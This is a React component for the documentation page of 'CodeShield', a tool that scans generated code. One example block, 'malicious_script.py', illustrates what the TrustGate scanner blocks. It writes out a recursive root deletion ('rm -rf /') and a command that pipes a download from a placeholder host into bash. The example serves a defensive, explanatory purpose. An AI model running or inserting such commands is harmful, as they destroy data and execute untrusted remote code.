import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Logo } from './Logo';

interface DocsProps {
    onBack?: () => void;
}

type DocSection = 'overview' | 'trustgate' | 'styleforge' | 'contextvault' | 'mcp' | 'api';

// Icons
const BookIcon = () => (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>
);
const ShieldIcon = () => (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
);
const WandIcon = () => (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M15 4V2"/><path d="M15 16v-2"/><path d="M8 9h2"/><path d="M20 9h2"/><path d="M17.8 11.8 19 13"/><path d="M15 9h0"/><path d="M17.8 6.2 19 5"/><path d="M3 21l9-9"/><path d="M12.2 6.2 11 5"/></svg>
);
const DatabaseIcon = () => (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
);
const ServerIcon = () => (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
);
const ApiIcon = () => (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
);
const ArrowLeftIcon = () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
);
const CopyIcon = () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
);
const CheckIcon = () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
);

const CodeBlock: React.FC<{ code: string; title?: string }> = ({ code, title }) => {
    const [copied, setCopied] = useState(false);

    const handleCopy = () => {
        navigator.clipboard.writeText(code);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    return (
        <div className="rounded-xl overflow-hidden bg-[#0d1117] border border-white/10 shadow-2xl my-6">
            <div className="flex items-center justify-between px-4 py-3 bg-[#161b22] border-b border-white/5">
                <div className="flex items-center gap-4">
                    <div className="flex gap-2">
                        <div className="w-3 h-3 rounded-full bg-[#FF5F56] border border-[#E0443E]/50" />
                        <div className="w-3 h-3 rounded-full bg-[#FFBD2E] border border-[#DEA123]/50" />
                        <div className="w-3 h-3 rounded-full bg-[#27C93F] border border-[#1AAB29]/50" />
                    </div>
                    {title && <span className="text-xs text-slate-400 font-mono opacity-75">{title}</span>}
                </div>
                <button 
                    onClick={handleCopy}
                    className="flex items-center gap-1.5 px-2 py-1 rounded hover:bg-white/5 text-xs text-slate-400 hover:text-white transition-colors"
                >
                    {copied ? <CheckIcon /> : <CopyIcon />}
                    {copied ? 'Copied' : 'Copy'}
                </button>
            </div>
            <pre className="p-4 text-sm text-slate-300 font-mono overflow-x-auto leading-relaxed custom-scrollbar selection:bg-brand-500/30">
                <code>{code}</code>
            </pre>
        </div>
    );
};

const NavItem: React.FC<{ 
    active: boolean; 
    onClick: () => void; 
    icon: React.ReactNode;
    label: string;
}> = ({ active, onClick, icon, label }) => (
    <button
        onClick={onClick}
        className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-left text-sm transition-all duration-200 ${
            active 
                ? 'bg-emerald-500/10 text-emerald-400 font-medium shadow-[0_0_15px_-3px_rgba(52,211,153,0.2)]' 
                : 'text-slate-400 hover:text-white hover:bg-white/5'
        }`}
    >
        <span className={`transition-colors duration-200 ${active ? 'text-emerald-400' : 'text-slate-500 group-hover:text-slate-300'}`}>{icon}</span>
        {label}
    </button>
);

export const Docs: React.FC<DocsProps> = ({ onBack }) => {
    const [activeSection, setActiveSection] = useState<DocSection>('overview');

    return (
        <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.3 }}
            className="fixed inset-0 z-50 bg-[#030305] overflow-y-auto"
        >
            <div className="min-h-screen flex flex-col">
                {/* Header */}
                <header className="border-b border-white/5 bg-slate-900/50 backdrop-blur-md sticky top-0 z-20">
                    <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
                        {/* Left Side: Logo & Labels */}
                        <div className="flex items-center gap-4 md:gap-6">
                            {/* Logo has its own text, so we just show it */}
                            <Logo size="sm" showText={true} />
                            
                            {/* Divider & Section Name */}
                            <div className="hidden md:flex items-center gap-4">
                                <span className="text-white/10 text-xl font-light">/</span>
                                <span className="text-sm text-slate-400 font-medium tracking-wide">DOCUMENTATION</span>
                            </div>
                        </div>

                        {/* Right Side: Navigation Actions */}
                        <div className="flex items-center gap-4">
                            <a href="https://github.com/Erebuzzz/CodeShield" target="_blank" rel="noopener" className="text-sm text-slate-400 hover:text-white transition-colors font-medium">
                                GitHub
                            </a>
                            
                            {onBack && (
                                <button
                                    onClick={onBack}
                                    className="group px-4 py-1.5 rounded-full border border-white/10 bg-white/[0.02] hover:bg-white/[0.08] text-sm text-slate-400 hover:text-white transition-all flex items-center gap-2"
                                >
                                    <span className="group-hover:-translate-x-0.5 transition-transform"><ArrowLeftIcon /></span>
                                    Back to App
                                </button>
                            )}
                        </div>
                    </div>
                </header>

                <div className="max-w-7xl mx-auto flex flex-1 w-full relative">
                    {/* Sidebar Navigation */}
                    <aside className="w-64 shrink-0 border-r border-white/5 p-6 sticky top-[73px] h-[calc(100vh-73px)] hidden md:block overflow-y-auto custom-scrollbar">
                        <div className="mb-6 px-3 text-[10px] font-bold text-slate-600 uppercase tracking-widest">Guide</div>
                        <nav className="space-y-1 mb-8">
                            <NavItem 
                                active={activeSection === 'overview'} 
                                onClick={() => setActiveSection('overview')}
                                icon={<BookIcon />}
                                label="Overview"
                            />
                            <NavItem 
                                active={activeSection === 'trustgate'} 
                                onClick={() => setActiveSection('trustgate')}
                                icon={<ShieldIcon />}
                                label="TrustGate"
                            />
                            <NavItem 
                                active={activeSection === 'styleforge'} 
                                onClick={() => setActiveSection('styleforge')}
                                icon={<WandIcon />}
                                label="StyleForge"
                            />
                            <NavItem 
                                active={activeSection === 'contextvault'} 
                                onClick={() => setActiveSection('contextvault')}
                                icon={<DatabaseIcon />}
                                label="ContextVault"
                            />
                        </nav>
                        
                        <div className="mb-6 px-3 text-[10px] font-bold text-slate-600 uppercase tracking-widest">Developers</div>
                        <nav className="space-y-1">
                            <NavItem 
                                active={activeSection === 'mcp'} 
                                onClick={() => setActiveSection('mcp')}
                                icon={<ServerIcon />}
                                label="MCP Server"
                            />
                            <NavItem 
                                active={activeSection === 'api'} 
                                onClick={() => setActiveSection('api')}
                                icon={<ApiIcon />}
                                label="API Reference"
                            />
                        </nav>
                    </aside>

                    {/* Main Content */}
                    <main className="flex-1 p-8 md:p-12 max-w-4xl">
                        <motion.div
                            key={activeSection}
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ duration: 0.3 }}
                        >
                            {activeSection === 'overview' && (
                                <div className="space-y-16">
                                    <div>
                                        <h1 className="text-4xl md:text-5xl font-display font-medium text-white mb-6">Introduction</h1>
                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
                                            CodeShield is a secure, intelligent coding assistant designed to protect your codebase from malicious patterns and poor practices. It acts as a firewall for your code generation workflow.
                                        </p>
                                    </div>

                                    {/* Features Grid */}
                                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                        {[
                                            { title: 'TrustGate', desc: 'Secure Sandbox', icon: <ShieldIcon /> },
                                            { title: 'StyleForge', desc: 'Auto-formatting', icon: <WandIcon /> },
                                            { title: 'ContextVault', desc: 'State Memory', icon: <DatabaseIcon /> },
                                        ].map((feature, i) => (
                                            <div key={i} className="p-6 rounded-2xl bg-white/[0.02] border border-white/5 hover:border-emerald-500/30 transition-colors group">
                                                <div className="mb-4 text-emerald-400 group-hover:scale-110 transition-transform origin-left">{feature.icon}</div>
                                                <h3 className="text-lg font-medium text-white mb-2">{feature.title}</h3>
                                                <p className="text-sm text-slate-400">{feature.desc}</p>
                                            </div>
                                        ))}
                                    </div>

                                    {/* How It Works Diagram */}
                                    <div>
                                        <h2 className="text-2xl font-display font-medium text-white mb-8">How It Works</h2>
                                        <div className="relative">
                                            {/* Connecting Line */}
                                            <div className="absolute left-[19px] top-8 bottom-8 w-0.5 bg-gradient-to-b from-emerald-500/50 via-emerald-500/20 to-transparent hidden md:block"></div>
                                            
                                            <div className="space-y-8">
                                                {[
                                                    { 
                                                        title: "Ingestion", 
                                                        desc: "CodeShield intercepts generated code from your LLM or manual input.",
                                                        icon: <ApiIcon />
                                                    },
                                                    { 
                                                        title: "Security Scan (TrustGate)", 
                                                        desc: "Code is executed in an isolated sandbox to detect malicious behavior, network calls, or dangerous imports.",
                                                        icon: <ShieldIcon />
                                                    },
                                                    { 
                                                        title: "Style Adaptation (StyleForge)", 
                                                        desc: "The system analyzes your project's existing files to apply consistent naming conventions and formatting rules.",
                                                        icon: <WandIcon />
                                                    },
                                                    { 
                                                        title: "Delivery", 
                                                        desc: "The verified, safe, and styled code is returned to your editor, ready for production.",
                                                        icon: <CheckIcon />
                                                    }
                                                ].map((step, i) => (
                                                    <div key={i} className="relative flex gap-6 group">
                                                        <div className="relative z-10 shrink-0 w-10 h-10 rounded-full bg-[#0d1117] border border-white/10 flex items-center justify-center text-slate-400 group-hover:text-emerald-400 group-hover:border-emerald-500/50 transition-colors shadow-lg">
                                                            {step.icon}
                                                        </div>
                                                        <div className="pt-1">
                                                            <h3 className="text-white font-medium mb-1 group-hover:text-emerald-400 transition-colors">{step.title}</h3>
                                                            <p className="text-sm text-slate-400 leading-relaxed font-light">{step.desc}</p>
                                                        </div>
                                                    </div>
                                                ))}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            )}
                            
                            {activeSection === 'trustgate' && (
                                <div className="space-y-10">
                                    <div>
                                        <h1 className="text-4xl font-display font-medium text-white mb-4">TrustGate</h1>
                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
                                            TrustGate validates generated code in a secure, isolated sandbox environment. It detects potential security vulnerabilities, infinite loops, and malicious imports before they touch your production environment.
                                        </p>
                                    </div>

                                    <div className="space-y-6">
                                        <h2 className="text-2xl font-display font-medium text-white">Security Detection Strategy</h2>
                                        <ul className="grid grid-cols-1 gap-4">
                                            {[
                                                "Static Analysis of AST to find dangerous imports (os, subprocess)",
                                                "Resource usage limits to prevent Denial of Service",
                                                "Network isolation in sandboxed execution containers"
                                            ].map((item, i) => (
                                                <li key={i} className="flex items-start gap-3 text-slate-400 bg-white/[0.01] p-3 rounded-lg border border-white/5">
                                                    <span className="text-emerald-400 mt-1"><CheckIcon /></span>
                                                    {item}
                                                </li>
                                            ))}
                                        </ul>
                                    </div>
                                    
                                    <div>
                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Example Detection</h2>
                                        <CodeBlock 
                                            title="malicious_script.py"
                                            code={`# Dangerous code detected by TrustGate
import os
import subprocess

def dangerous_operation():
    # TrustGate blocks this instantly
    subprocess.run("rm -rf /", shell=True)
    
    # And this too
    os.system("curl malicious.site | bash")`}
                                        />
                                    </div>
                                </div>
                            )}

                            {activeSection === 'styleforge' && (
                                <div className="space-y-10">
                                    <div>
                                        <h1 className="text-4xl font-display font-medium text-white mb-4">StyleForge</h1>
                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
                                            StyleForge ensures your generated code feels like home. It analyzes your existing codebase to detect naming conventions and coding patterns, then automatically adapts new code to match.
                                        </p>
                                    </div>

                                    <div className="space-y-6">
                                        <h2 className="text-2xl font-display font-medium text-white">Features</h2>
                                        <div className="grid grid-cols-1 gap-4">
                                            {[
                                                { title: "Universal Pattern Detection", desc: "Identifies snake_case, camelCase, PascalCase automatically." },
                                                { title: "Intelligent Auto-Correction", desc: "Rewrites variable/function names to match project style." },
                                                { title: "Conflict Prevention", desc: "Ensures new identifiers don't clash with existing ones." }
                                            ].map((item, i) => (
                                                <div key={i} className="p-4 rounded-xl bg-white/[0.02] border border-white/5">
                                                    <strong className="text-emerald-400 block mb-1">{item.title}</strong>
                                                    <span className="text-slate-400 text-sm">{item.desc}</span>
                                                </div>
                                            ))}
                                        </div>
                                    </div>

                                    <div>
                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Before vs After</h2>
                                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                                            <CodeBlock
                                                title="Raw LLM Output (Mixed Style)"
                                                code={`def CalculateTotal(Users_List):
    TotalValue = 0
    for U in Users_List:
        TotalValue += U.price
    return TotalValue`}
                                            />
                                            <CodeBlock
                                                title="StyleForge (Verified snake_case)"
                                                code={`def calculate_total(users_list):
    total_value = 0
    for user in users_list:
        total_value += user.price
    return total_value`}
                                            />
                                        </div>
                                    </div>
                                </div>
                            )}

                            {activeSection === 'contextvault' && (
                                <div className="space-y-10">
                                    <div>
                                        <h1 className="text-4xl font-display font-medium text-white mb-4">ContextVault</h1>
                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
                                            ContextVault acts like a "Save Game" for your development workflow. It captures your entire mental state: open files, cursor positions, and notes, so you can switch tasks without losing focus.
                                        </p>
                                    </div>

                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                        <div className="p-6 rounded-2xl bg-gradient-to-br from-emerald-500/10 to-teal-500/5 border border-emerald-500/10">
                                            <div className="text-emerald-400 mb-3"><DatabaseIcon /></div>
                                            <h3 className="text-white font-medium mb-2">State Persistence</h3>
                                            <p className="text-sm text-slate-400 leading-relaxed">Saves open files, active tabs, and exact cursor locations to a local SQLite database.</p>
                                        </div>
                                        <div className="p-6 rounded-2xl bg-gradient-to-br from-teal-500/10 to-emerald-500/5 border border-teal-500/10">
                                            <div className="text-teal-400 mb-3"><WandIcon /></div>
                                            <h3 className="text-white font-medium mb-2">Instant Restore</h3>
                                            <p className="text-sm text-slate-400 leading-relaxed">One-click restoration brings your IDE back to the exact moment you left off.</p>
                                        </div>
                                    </div>

                                    <div>
                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Data Structure</h2>
                                        <CodeBlock 
                                            title="context.json"
                                            code={`{
  "name": "refactoring-auth-module",
  "created_at": "2023-10-27T10:30:00Z",
  "files": [
    "src/auth/login.py",
    "src/auth/user.py"
  ],
  "cursor": {
    "file": "src/auth/login.py",
    "line": 42,
    "column": 15
  },
  "notes": "Remember to fix the token expiration logic."
}`}
                                        />
                                    </div>
                                </div>
                            )}

                            {activeSection === 'mcp' && (
                                <div className="space-y-10">
                                    <div>
                                        <h1 className="text-4xl font-display font-medium text-white mb-4">MCP Server Integration</h1>
                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
                                            CodeShield exposes functionality via the Model Context Protocol (MCP), allowing AI models to leverage secure execution and validation capabilities directly.
                                        </p>
                                    </div>

                                    <CodeBlock 
                                        title="mcp_config.json"
                                        code={`{
  "name": "verify_code",
  "description": "Verify code security and correctness",
  "inputSchema": {
    "type": "object",
    "properties": {
      "code": { "type": "string" }
    },
    "required": ["code"]
  }
}`}
                                    />
                                </div>
                            )}

                            {activeSection === 'api' && (
                                <div className="space-y-10">
                                    <div>
                                        <h1 className="text-4xl font-display font-medium text-white mb-4">API Reference</h1>
                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
                                            The CodeShield API allows you to integrate security scanning and style enforcement directly into your CI/CD pipelines or custom tools.
                                        </p>
                                    </div>

                                    <div className="space-y-8">
                                        <div className="border border-white/5 rounded-2xl overflow-hidden bg-white/[0.01]">
                                            <div className="bg-white/[0.03] px-5 py-4 flex items-center gap-3 border-b border-white/5">
                                                <span className="px-2.5 py-1 rounded-md text-xs font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/10">POST</span>
                                                <code className="text-sm text-slate-300 font-mono">/api/verify</code>
                                            </div>
                                            <div className="p-6">
                                                <p className="text-sm text-slate-400 mb-6">Analyzes code for security vulnerabilities and dangerous patterns.</p>
                                                <CodeBlock
                                                    title="Request Body"
                                                    code={`{
  "code": "print('hello')",
  "auto_fix": true,
  "use_sandbox": false
}`}
                                                />
                                            </div>
                                        </div>

                                        <div className="border border-white/5 rounded-2xl overflow-hidden bg-white/[0.01]">
                                            <div className="bg-white/[0.03] px-5 py-4 flex items-center gap-3 border-b border-white/5">
                                                <span className="px-2.5 py-1 rounded-md text-xs font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/10">POST</span>
                                                <code className="text-sm text-slate-300 font-mono">/api/style</code>
                                            </div>
                                            <div className="p-6">
                                                <p className="text-sm text-slate-400 mb-6">Checks code against the project's detected style conventions.</p>
                                                <CodeBlock
                                                    title="Request Body"
                                                    code={`{
  "code": "def MyFunction(): pass",
  "codebase_path": "./src"
}`}
                                                />
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            )}
                        </motion.div>
                    </main>
                </div>
            </div>
        </motion.div>
    );
};

export default Docs;
